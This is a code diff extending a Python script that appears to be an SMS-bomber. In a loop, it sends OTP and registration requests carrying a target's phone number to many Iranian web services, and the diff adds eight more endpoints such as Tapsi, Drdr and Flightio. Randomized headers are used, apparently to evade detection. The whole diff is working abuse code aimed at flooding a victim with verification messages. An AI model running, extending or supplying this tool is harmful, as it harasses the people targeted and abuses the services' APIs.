@@ -26,7 +26,7 @@ numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "t
 
 i = 0
 
-def data(number):
+def date(number):
     url_divar = "https://api.divar.ir/v5/auth/authenticate"
     json_divar = {"phone":number}
 
@@ -80,9 +80,46 @@ def data(number):
         "mobile": "0"+number
     }
     
-    return url_divar,json_divar,url_snapp,json_snapp,url_sheypoor,json_sheypoor,url_jet,json_jet,url_virgool,json_virgool,url_snapp_box,json_snapp_box,url_banimode,json_banimode,url_ostadkr,json_ostadkr,url_drnext,json_drnext,url_basalam,json_basalam,url_buskool,json_buskool,url_jabama,json_jabama,url_alibaba,json_alibaba,url_digitoon,json_digitoon
+    url_sibapp = "https://api.sibapp.net/api/v1/user/register"
+    json_sibapp ={"phone_number": "0" + number}
 
-url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon = data(number)
+    url_Drdr= "https://drdr.ir/api/registerEnrollment/register/verify"
+    json_Drdr = {
+	"phoneNumber": "0" + number,
+	"userType": "PATIENT"
+    }
+
+    url_kukala= "https://api.kukala.ir/api/user/Otp"
+    json_kukala = {"phoneNumber": "0" + number}
+
+    url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
+    json_tapsi = {
+        "credential": {
+            "phoneNumber": "0" + number,
+            "role": "PASSENGER"
+        },
+        "otpOption": "SMS"
+    }
+
+    url_flightio = "https://flightio.com/bff/Authentication/CheckUserKey"
+    json_flightio = {
+        "userKey": "98-" + number,
+        "userKeyType": 1
+    }
+
+    url_football_360 = "https://football360.ir/api/auth/verify-phone/"
+    json_football_360 = {"phone_number": "+98" + number}
+
+
+
+    url_miare = "https://www.miare.ir/api/otp/driver/request/"
+    json_miare = {"phone_number": "0" + number}
+
+    url_pinket = "https://pinket.com/api/cu/v2/phone-verification"
+    json_pinket = {"phoneNumber": "0" + number}
+    return url_divar,json_divar,url_snapp,json_snapp,url_sheypoor,json_sheypoor,url_jet,json_jet,url_virgool,json_virgool,url_snapp_box,json_snapp_box,url_banimode,json_banimode,url_ostadkr,json_ostadkr,url_drnext,json_drnext,url_basalam,json_basalam,url_buskool,json_buskool,url_jabama,json_jabama,url_alibaba,json_alibaba,url_digitoon,json_digitoon,url_sibapp,json_sibapp,url_Drdr,json_Drdr,url_kukala,json_kukala,url_tapsi,json_tapsi,url_flightio,json_flightio,url_football_360,json_football_360,url_miare,json_miare,url_pinket,json_pinket
+
+url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket = date(number)
 
 
 
@@ -183,10 +220,29 @@ while i < numbert:
     print("15-Digoon",req_digitoon)
     time.sleep(sleep_time)
 
+    req_sibapp = requests.post(url=url_sibapp,json=json_sibapp,headers=random_head)
+    print("16-Sibapp",req_sibapp)
 
+    req_Drdr = requests.post(url=url_Drdr,json=json_Drdr,headers=random_head)
+    print("17-Drdr",req_Drdr)
 
+    req_kukala = requests.post(url=url_kukala,json=json_kukala,headers=random_head)
+    print("18-kukala",req_kukala)
 
+    req_tapsi = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
+    print("19-Tapsi",req_tapsi)
 
+    req_flightio = requests.post(url=url_flightio,json=json_flightio,headers=random_head)
+    print("20-Flightio",req_flightio)
+
+    req_football_360 = requests.post(url=url_football_360,json=json_football_360,headers=random_head)
+    print("21-Football_360",req_football_360)
+
+    req_miare = requests.post(url=url_miare,json=json_miare,headers=random_head)
+    print("22-miare",req_miare)
+
+    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
+    print("23-pinket",req_pinket)
 
 
 
